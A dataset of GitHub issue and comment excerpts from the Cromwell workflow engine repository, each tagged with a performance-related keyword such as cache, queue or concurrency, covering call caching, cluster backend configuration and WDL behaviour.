Performance,"I recently got into a trouble because of wrong caching in cromwell. In most of my pipelines I copy the results of last tasks to some folder which I define in the variable (unfortunately the option.json feature of cromwell to kind'of ""copy workflow results"" is useless for us as it copies all the nested trash, like ""id/execution"" instead of just resulting files). ; Unfortunately, my task that does the copying was cached even if the task on which it depends had different inputs (and was not cached). That means that we have a false positive caching and the copying task copies the same file from cache all over again.; Here is an example of my WDL. However, it fails in all WDLs where I use the copy-task for results; ```wdl; workflow Diamond_Blast {. Int threads; File db; File query; String result_name; String results_folder; String mode = ""blastx"". call diamond_blast {; input:; threads = threads,; database = db,; name = result_name,; query = query,; mode = mode. }. call copy as copy_results {; input:; files = [diamond_blast.out],; destination = results_folder; }. output {; File out = copy_results.out[0]; }. }. task diamond_blast {. Int threads; File database; File query; String name; String mode. command {; diamond ${mode} -d ${database} -q ${query} \; --more-sensitive -o ${name}.m8 \; -f 6 sseqid qseq score pident stitle qcovhsp qtitle \; }. runtime {; docker: ""quay.io/comp-bio-aging/diamond:latest""; }. output {; File out = name + "".m8""; }. }. task copy {; Array[File] files; String destination. command {; mkdir -p ${destination}; cp -L -R -u ${sep=' ' files} ${destination}; }. output {; Array[File] out = files; }; }; ```; and here is an example of the input:; ```json. Diamond_Blast.mode = ""blastp""; Diamond_Blast.query = ""/pipelines/indexes/GRAY_WHALE/NTJE01P.1.fasta""; Diamond_Blast.threads = 8; Diamond_Blast.result_name = ""graywhale_in_minkywhale_blastp""; Diamond_Blast.db = ""/pipelines/indexes/diamond/MINKY_WHALE_GCF_000493695.1.dmnd""; Diamond_Blast.results_folder = ""/pip",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044:415,cache,cached,415,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044,3,['cache'],"['cache', 'cached']"
Performance,I recommend using the call cache diff endpoint; ```; GET ​/api​/workflows​/v1/callcaching​/diff; ```. > This endpoint returns the hash differences between 2 completed (successfully or not) calls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176:27,cache,cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176,1,['cache'],['cache']
Performance,"I run cromwell on a SLURM cluster with a postgres database for call caching. Call caching mostly works fine, but there is no way to constrain the size of the cache. Eventually the available space (200GB) for the postgres database fills up, and all cromwell instances using the call cache fail. My workaround is to periodically stop all workflows and truncate the call caching database. . I imagine implementing an option to restrict the number of cache entries should be straightforward for a Guava-based cache; if someone could help roadmap, I may be able to submit a pull request in the future. . For my purposes, I assume that all cromwell instances agree on the size.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7560:158,cache,cache,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7560,4,['cache'],['cache']
Performance,"I see how this is related to the WDL description and not to much with the implementation. For `read_lines` WDL specification, it says that the order should be the same as in the file-like object; but it is unclear if map is ordered, and there is no specific behavior to the `read_map` function. I would say that whenever things comes from a file it would be a good idea to keep the order, but I understand the possible problems with performance. Although if `LinkedHashMap` is used I can only see problems with performance if deletion/insertion in concrete indexes is required; definitely a `TreeMap` does not look like a good idea because the ""natural order"" might not be the one for the final user. Thanks for looking into this @Horneth and @cjllanwarne!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368548965:433,perform,performance,433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368548965,2,['perform'],['performance']
Performance,"I see, so in order to call cache on an old workflow Cromwell has to dig into the database. . - Effort: **?**; - Risk: **Medium**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-326330274:27,cache,cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-326330274,1,['cache'],['cache']
Performance,"I still see this, somewhat. It might be due to the long time on cromwell; final overhead. In other words, my job finishes, but the overhead takes so; long that an unrelated failure prevents the write to the call-cache; database. On Tue, Apr 4, 2017 at 12:48 PM, Kate Voss <notifications@github.com> wrote:. > If there are no more problems, we'll close this.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1494#issuecomment-291561557>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk0dV9BaGvlpzXleUmgZ3s6-BsN6Lks5rsnRngaJpZM4KJB9H>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1494#issuecomment-291572106:212,cache,cache,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1494#issuecomment-291572106,1,['cache'],['cache']
Performance,I suggest also allow specifying walltime and queue; walltime in particular as it enables most efficient performance of the scheduler and is often a required resource request in traditional HPC cluster setups.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-207641967:45,queue,queue,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-207641967,2,"['perform', 'queue']","['performance', 'queue']"
Performance,"I think I have resolved this.; My `query` call always includes a workflow name, but I had been issuing an unrestricted query and doing the filtering client side. When I change the query call to filter on `name`, it returns successfully on a consistent basis.; So I interpret this to mean that it was the `query` call itself that was generating a large number of queued tasks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394782296:362,queue,queued,362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394782296,1,['queue'],['queued']
Performance,"I think in general the number of concurrent jobs is determined by both of client side (cromwell) and server side(aws batch). In cormwell, there should be a rate limit of api call (no matter it is job submission or job status query) to avoid DDoS to the server side. On the server side like aws batch, there is also a config for rate limit of concurrent api call, if the number of concurrent api call exceeds the rate limit of server side, the server side may refuse to server so it is important not to set rate limit on the client side/cromwell over the server side rate limit. While on server side, if the concurrent jobs require more resources than the limit such as cpus and mem (compute env in aws batch) , it is the server side responsibility to put the concurrent jobs to queue and make sure they can be launched later when resource is available rather than throwing errors unless the queue is expired (say, resource is still not available one week later). IMHO, aws batch backend should implement the scatter jobs in array jobs which support multiple jobs submission and status query in one single api call, otherwise, it is too easy to exceed the rate limit of aws batch. jobs submission by user --> cromwell (rate limit config) --> aws batch gateway (rate limit config) --> aws batch compute env (resource limit)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395:33,concurren,concurrent,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-444666395,7,"['concurren', 'queue']","['concurrent', 'queue']"
Performance,"I think it has to, in order to see if the image in the cache hash matches the current pull (or other) request, here is an example: https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/library/pull.go#L55. I’m not super familiar with the code, but looks like the hash is retrieved here https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/client/oci/pull.go#L36 and then needs to get a manifest https://github.com/hpcng/singularity/blob/2c6cf59870cf0172d61099a3198def8334c94827/internal/pkg/build/oci/oci.go#L133 which I’d suspect does just that. https://github.com/containers/image/blob/175bf8b8f9ad897bdc10761e11b466d00f516a63/types/types.go#L238. If a user doesn’t have internet access, or has limited, or there is need to query the registry, might run into trouble. I just tried running an exec to a Docker uri, first of course with Internet to make sure that the images in my cache, and then I disabled my wireless. Without wireless, of course, I couldn’t run anything. This issue could be avoided if the user pulled an image first and then use that image instead of this Docker uri.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995:55,cache,cache,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631184995,2,['cache'],['cache']
Performance,I think it'd be good to right at the top make a big point about the number one 'feature' here is enhanced performance and scalability,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1477#issuecomment-249003742:106,perform,performance,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1477#issuecomment-249003742,2,"['perform', 'scalab']","['performance', 'scalability']"
Performance,"I think that's a different request. #2652 is asking to make available the wdltool syntax validation from within cromwell. This one is asking for a new type of validation, analogous in some ways to the GATK Queue ""dry run"" feature.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332257390:206,Queue,Queue,206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332257390,1,['Queue'],['Queue']
Performance,"I think the cache is unrelated, this is purely input localisation. I re-ran the job with caching disabled in the config file. The same error occurs. From this directory: /share/ScratchGeneral/evaben/cromwell/cromwell-executions/PreProcessingForVariantDiscovery_GATK4/37e4e046-b256-4f81-95c6-9f0c915810bf/call-SamToFastqAndBwaMem/inputs/-21323395 . There is a file 'cromwell.tmp' which seems to be a partial copy of my cromwell process' CWD. All of the logs are copied in, (cromwell.tmp/cromwell-workflow-logs/) and a single seemingly unrelated job (cromwell.tmp/cromwell-executions/HaplotypeCallerGvcf_GATK4/f18cded7-24ae-470d-b58d-d87ce97f21cb/call-HaplotypeCaller/shard-6/). All of that jobs 'execution' folder, and some of its 'inputs' are copied. It is not clear if more would have been copied in or if the process was ended by the soft link error mentioned above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3825#issuecomment-401217803:12,cache,cache,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3825#issuecomment-401217803,2,['cache'],['cache']
Performance,"I think the effect is fine. We often tell people that once a job is runnable that Cromwell fires it off, but that's always used as a way to help them understand that Cromwell isn't partaking in true scheduling (ie resource based negotiation via SGE, PAPI, etc). IMO it's absolutely ok for jobs which are runnable to have not started if that's the limitation the system imposes. Further, I think it's a good move in the resiliency front. Infinite scalability is a great goal, but from a practical perspective a limit is always going to be reached, so finding ways to make the system manage to keep on ticking ok when that happens is a good thing. That's generally going to involve slowing things down.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370621740:446,scalab,scalability,446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370621740,1,['scalab'],['scalability']
Performance,"I think the following workflow (test.wdl) shows some even more insidious issues with localization:; ```; version 1.0. workflow main {; call main {; input:; X = [""/tmp/1"", ""/tmp/2"", ""/tmp/3""],; Y = [""/tmp/1"", ""/tmp/2"", ""/tmp/3""]; }. output {; Array[String] out = main.out; }; }. task main {; input {; Array[File]? X; Array[File]? Y; }. command <<<; echo X=~{if defined(X) then write_lines(select_first([X])) else X}; echo ~{if defined(Y) then ""Y="" + write_lines(select_first([Y])) else Y}; >>>. output {; Array[String] out = read_lines(stdout()); }. runtime {; docker: ""ubuntu:20.04""; }; }; ```. The following run:; ```; $ touch /tmp/{1,2,3}; $ cd /home/freeseek/cromwell; $ java -jar cromwell-51.jar run test.wdl; ```. Generates the following main.out:; ```; [""X=/cromwell-executions/main/bc07dd07-017f-41cf-9ba5-9f6e014a475b/call-main/execution/write_lines_c53d7635054b80e6d4298c99f823d256.tmp"",; ""Y=/home/freeseek/cromwell/cromwell-executions/main/bc07dd07-017f-41cf-9ba5-9f6e014a475b/call-main/execution/write_lines_c53d7635054b80e6d4298c99f823d256.tmp""]; ```. I can guess that in one case write_lines() is run before localization and in one case it is run after localization, generating two at first extremely puzzling different outputs. Notice that the [WDL specification](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-input-localization) requires that `Files are localized into the execution directory prior to the task execution commencing.` which does not seem to be the case for Cromwell. This seems to me like a serious bug. Where is it specified when Cromwell performs localization of files?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5540#issuecomment-657253592:1592,perform,performs,1592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5540#issuecomment-657253592,1,['perform'],['performs']
Performance,"I think the issue is actually reversed. The call cache diff endpoint should be accessing metadata which means the missing info are the call cache hashes should be in the metadata store. We say that the metadata repository is the collection of every meaningful event that has occurred in the system and that allows downstream clients to shape that information to suit their needs. That's why all user facing ""gie me information about XYZ"" endpoints read from there. This should be the same I think.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306891648:49,cache,cache,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-306891648,2,['cache'],['cache']
Performance,"I think we might be having a similar issue:; ```; Bad output 'pindel.deletions': Futures timed out after [60 seconds]; Bad output 'pindel.insertions': Futures timed out after [60 seconds]; Bad output 'pindel.long_insertions': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. If we don't want to change our caching strategy, can we simply increase the timeout? Can that be done with `akka.http.server.request-timeout`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-444687019:499,concurren,concurrent,499,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-444687019,10,['concurren'],['concurrent']
Performance,"I thought I was going crazy! Thanks @rhpvorderman, I think this is a great PR, and really looking forward to being able to test this on our HPC. I'm still a little concerned with Cromwell requesting the whole file (up to 200GB) and it's impact on our network. But this is definitely a step in the write direction. I was thinking of maybe adding something similar, but would check the file size, and then perform `xxh64` on the first 1MB or some region of the file (eg: `size+xxh64-partial`). I'm happy to produce some documentation (whether a part of this PR, or linked to it), about call-caching on Cromwell and to include this new material once I can test it okay. Thanks for pinging me @rhpvorderman, excited to try this out!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599207733:404,perform,perform,404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-599207733,1,['perform'],['perform']
Performance,"I thought it was a feature request (wdlDependencies isn't a documented field for batch endpoint in the README.md) but if you're expecting that it should work, then it's a bug report - because if I submit to `:version/batch` specifying `wdlDependencies`: ; ```; curl http://bionode05/cromwell/api/workflows/V1/batch -FwdlSource=@test.wdl -FworkflowInputs=@test.batch.inputs -FwdlDependencies=@dependency.wdl.zip; ```; I get a failed workflow with the following metadata (no `imports` in the `submittedFiles` block):; ```; {; ""submittedFiles"": {; ""inputs"": ""{\""test.foo.showIt\"":\""that\""}"",; ""workflow"": ""import \""dependency.wdl\"" as dependency\n\nworkflow test {\n\n\tcall dependency.foo\n\n}\n"",; ""options"": ""{\n\n}""; },; ""calls"": {. },; ""outputs"": {. },; ""id"": ""d97a5124-0933-4243-b542-6467b496ba22"",; ""inputs"": {. },; ""submission"": ""2016-12-08T10:21:10.205+10:00"",; ""status"": ""Failed"",; ""failures"": [{; ""message"": ""Workflow input processing failed.\nUnable to load namespace from workflow: Failed to import workflow, no import sources provided.""; }],; ""end"": ""2016-12-08T10:21:16.957+10:00"",; ""start"": ""2016-12-08T10:21:16.952+10:00""; }; ```. The exact same `curl` command line submission (with suitable inputs file) but to the `:version` endpoint works ok.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1753#issuecomment-265617532:962,load,load,962,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1753#issuecomment-265617532,1,['load'],['load']
Performance,"I tried the `GET ​/api​/workflows​/v1/callcaching​/diff`, but it didn't seam to work, and something wrong in Array..... I compared the ""callCaching"" of the same task between two workflows, all of them is the same except the red box :; ![image](https://user-images.githubusercontent.com/70520563/115682260-dedefc00-a387-11eb-8164-f21830f1c4a6.png); md5 values are the same, but the following paths are different. Therefore, I guess the reason of cache miss hit is caused by ""md5+path""; And Who knows how to remove path from MD5 value ?. I've tried many ways, but I don't know how to get rid of path in MD5 value. ; Who can help me please !",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-824659689:445,cache,cache,445,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-824659689,1,['cache'],['cache']
Performance,"I tried to throttle to only 50 jobs at a time, but it didn't seem to help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276790934:11,throttle,throttle,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276790934,1,['throttle'],['throttle']
Performance,"I use this config in a SGE backend for singularity. ```; Singularity {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 100; exit-code-timeout-seconds = 120; runtime-attributes = """"""; String sif; Float? memory_gb; String? bind_path; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l mem_free="" + memory_gb + ""g""} \; singularity exec -e --bind ${cwd}:${cwd} \; ${""--bind "" + bind_path} \; ${sif} \; ${job_shell} ${script}; """""". job-id-regex = ""(\\d+)""; check-alive = ""qstat -j ${job_id}""; kill = ""qdel ${job_id}""; }; }; ```; Every task should have a `String sif`, point to the path to sif file. You can modify this according to your need.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048:169,concurren,concurrent-job-limit,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1188515048,1,['concurren'],['concurrent-job-limit']
Performance,"I want reduce the length of bash command line when perform the joint-genotyping on thousands samples, so that I'm using InitialWorkDirRequirement to create a file path list. Here's the example CWL:; ```; #!/usr/bin/env cwl-runner. cwlVersion: v1.0. class: CommandLineTool. requirements:; - class: InlineJavascriptRequirement; - class: DockerRequirement; dockerPull: quay.io/shenglai/alpine_with_bash:1.0; - class: InitialWorkDirRequirement; listing:; - entryname: ""files.json""; entry: $(inputs.files.basename); inputs:; files: File. outputs:; output:; type: File; outputBinding:; glob: ""files.json"". baseCommand: []; ```; the input is; ```; {; ""files"": {""class"": ""File"", ""path"": ""/mnt/glusterfs/a.file""}; }; ```; the cwltool output `files.json` is. ```; {""basename"":""a.file"",""nameroot"":""a"",""nameext"":"".file"",""location"":""file:///mnt/glusterfs/a.file"",""path"":""/var/lib/cwl/stg1a204114-8318-47ee-b5d0-7454ab87f7df/a.file"",""dirname"":""/var/lib/cwl/stg1a204114-8318-47ee-b5d0-7454ab87f7df"",""class"":""File"",""size"":0}; ```. the cromwell one is; ```; {""nameext"":"".file"",""location"":""/mnt/glusterfs/a.file"",""path"":""/mnt/glusterfs/a.file"",""size"":0,""dirname"":""/mnt/glusterfs"",""secondaryFiles"":[],""basename"":""a.file"",""class"":""File"",""nameroot"":""a""}; ```. As you can see, from cwltool, it actually returns a mapped path under `path`, so the later docker command can pick that up.; On the other hand, cromwell only returns the host path, which can not be found in docker. I only tested the piece with SLURM. I would assume it also fails on local run.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4533:51,perform,perform,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4533,1,['perform'],['perform']
Performance,I was having trouble with my PR builds so I blew away all the caches; that seems to have had beneficial effects here too. 🙂,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5330#issuecomment-570748662:62,cache,caches,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5330#issuecomment-570748662,1,['cache'],['caches']
Performance,"I was running this on gsa4. Can you submit sge jobs from your laptop? can; your sctter test on gsa4 submitting to sge before you insult my beautiful; iMac? :-p. On Mon, Feb 6, 2017 at 6:29 PM, Jeff Gentry <notifications@github.com>; wrote:. > Got a chance to look w/ a profiler. Situation definitely *is* improved; > over previous in that I had to dramatically increase the size of the; > scatter to get hung up again (this is on my laptop which is apparently way; > faster than whatever machine @yfarjoun <https://github.com/yfarjoun> is; > using).; >; > The new bottleneck appears to be ExecutionStore.arePrerequisitesDone,; > sitting at 99% and growing CPU usage. Specifically the exists call in; > ExecutionStore.isDone and the collect on key.scope.upstream.; >; > Note that isDone was also the previous hotspot but it doesn't appear to; > be the FQN calculation any more, rather just the exists itself.; >; > It's possible that there's still something we can do a la the FQN here but; > if not my concern is that this is going to take you into the ""something; > clever"" realm.; >; > BTW @yfarjoun <https://github.com/yfarjoun> whatever machine you're; > running this on is also part of your bottleneck. I was able to do a 40k; > scatter no problem on one of my laptop cores, then just threw in 200k which; > is what locked it up. If you can't do 1k perhaps retry on something not; > from the stone age? ;); >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277848692>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACnk0oXuof6pg3nhG_3qO-drfxxs4dEvks5rZ6zmgaJpZM4L0Um8>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277887938:564,bottleneck,bottleneck,564,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277887938,2,['bottleneck'],['bottleneck']
Performance,"I was running through the tutorial, https://cromwell.readthedocs.io/en/develop/tutorials/ServerMode/. I typed the inputs.json file with a tab instead of spaces. ```curl -X POST http://localhost:8000/api/workflows/v1 -F workflowSource=@hello.wdl -F workflowInputs=@inputs.json```. ```; {; ""status"": ""fail"",; ""message"": ""Error(s): Input file is not valid yaml nor json: while scanning for the next token\nfound character '\\t(TAB)' that cannot start any token. (Do not use \\t(TAB) for indentation)\n in 'reader', line 2, column 1:\n \t\""test.hello.name\"": \""World\""\n ^\n""; }; ```. However per the JSON spec, tabs, or any whitespace, ""can be inserted between any pair of tokens"" https://www.json.org/. Python:; ```; json.loads(""{\n\t\""valid\"":\""json\""\n}""); ```. Sadly I do not know Java very well or I would just check and or fix whichever parser you are using. Thanks",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487:720,load,loads,720,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487,1,['load'],['loads']
Performance,"I was testing some call caching behaviors. Specifically I tried to call cache on local backend with the ""hash the file path"" method which would hash a file path even though the file doesn't exist. The job would then try to find a cache hit for this path even though the file doesn't exist",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280759949:72,cache,cache,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280759949,2,['cache'],['cache']
Performance,"I was using 3.4.1 and saw behavior where one of the copies did the download into the cache, and the second saw the partial file in the cache and tried to run it and failed. And yes, it's a local registry that I convinced to run inside singularity instead of docker since my production hosts are centos6 and are not happy with docker currently (and I'd rather have the control singularity gives me).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537244158:85,cache,cache,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537244158,2,['cache'],['cache']
Performance,"I would like to allow caching, although the size of the saved execution folder makes that prohibitive. I am suggesting a scheme in which large intermediate objects (files) can be removed by Cromwell at our suggestion, yet permit intact caching. In this scheme it would be possible to mark a task output as ""too big to keep, please remove when no longer referenced"" (or something more pithy). The object would be left in the execution folder until after its last mention and then removed (or at the very end of the workflow). Caching would then need to be modified to ""bracket"" the first task in which the object is mentioned as an output and the last task for which it is an input. This group of tasks would be considered as a group. The group of tasks would be skipped if the inputs to the first task and the outputs from the last task are all cache hits. (In case the group is not linear but some other DAG the scheme could be abandoned, or else perhaps the method would generalize with more complicated rules--I'm not sure.). Following is a motivation of the need for this feature, and sequence of arguments for why it can work.; ---------------------; We have a certain amount of input and output objects that we keep in their own buckets. The outputs are copied out of the execution folder after the workflow completes. These files we cache by reference, and that works fine, and we want to keep the inputs and outputs forever. However we have a large volume of intermediate files which end up in our cromwell-executions bucket. We love caching. It works great. A fully cached workflow runs in about 5 minutes at next to no cost. Fresh workflows (no cache hits) cost on the order of $0.50 for typical examples, and run for a few hours. Object storage has been eating us up, though. We've worked out that for a single one of these workflows the break even point at which it's cheaper to rerun it than to save it and cache it is about a week. If you take into account that we re-run workflows only ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4064:845,cache,cache,845,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4064,1,['cache'],['cache']
Performance,I would like to be able to tell Cromwell to not use a workflow for cached results without mucking around the database. ; ![628b747f8ccdfb757062f36a27eedecfc2295f515c0586e05fbfb0620c0571a2](https://cloud.githubusercontent.com/assets/961771/20325706/cb81eed2-ab53-11e6-90a5-802160419fa5.jpg),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670:67,cache,cached,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670,1,['cache'],['cached']
Performance,I would recommend to make this a finite-state machine and have it resubmit if the script-code performs a `SIGINT` for the following line:. ```; val processReturnCode = process.exitValue() // blocks until process finishes; ```. Below is the location of the line:. https://github.com/broadinstitute/cromwell/blob/599f1ddb31fb11bfd4fdc4c49f0505aba69e03f3/src/main/scala/cromwell/engine/backend/local/LocalBackend.scala#L203. ~p,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177665209:94,perform,performs,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177665209,1,['perform'],['performs']
Performance,"I'd estimate Travis/Dockering Grid Engine as medium effort, as others have already done it. Example links for the inspired:; - Google result [example](https://github.com/gawbul/docker-sge/blob/ff400b613f5bb1eae28f16e6a47d8bb1116e9617/Dockerfile) of docker+sge (crazy number of docker layers though!); - https://support.univa.com/ would probably help us (we have a license somewhere, and can probably run it similar to how we only run JES for Broad users); - help@broad would probably help create an installer script as well. For example, years ago there was a script that installed Sun's Grid Engine via CloudFormation. Speaking of Sun Microsystems, SGE is [dead](http://www.softpanorama.net/HPC/Grid_engine/Implementations/index.shtml), as well as its successors [OGE](http://www.oracle.com/technetwork/oem/grid-engine-166852.html) and an attempted-then-abandoned FOSS fork [OGS](http://gridscheduler.sourceforge.net/). Long live [SoGE](https://arc.liv.ac.uk/SGE/), and [UGE](http://www.univa.com/products/#service2). It's fine to use ""SGE"", just like we use the term ""JES"", but we'll likely need to target specifically UGE for Broadies and/or SoGE for the rest of the Grid Engine world. > Outside of Broad we probably have more LSF users than SGE users. True, there are lots of [popular](https://trends.google.com/trends/explore?date=today%205-y&q=Grid%20Engine,%2Fm%2F082f3d,%2Fm%2F0cmb2ky,%2Fm%2F04n7lk2) grid [schedulers](https://en.wikipedia.org/wiki/Job_scheduler#Batch_queuing_for_HPC_clusters). I'd be more than happy to run yet-another-travis-job for whatever scheduler, if someone contribs the docker image / setup script like we have for Funnel. > I don't know how well our SGE stuff works with UGER so perhaps not. Cromwell works great on BITS' newer UGE cluster named ""UGER"". I use cromwell frequently with `concurrent-job-limit` set to 900 due to our resource caps. **TL;DR Getting grid engine test support setup for a Broad-like environment is possible, just hasn't been a 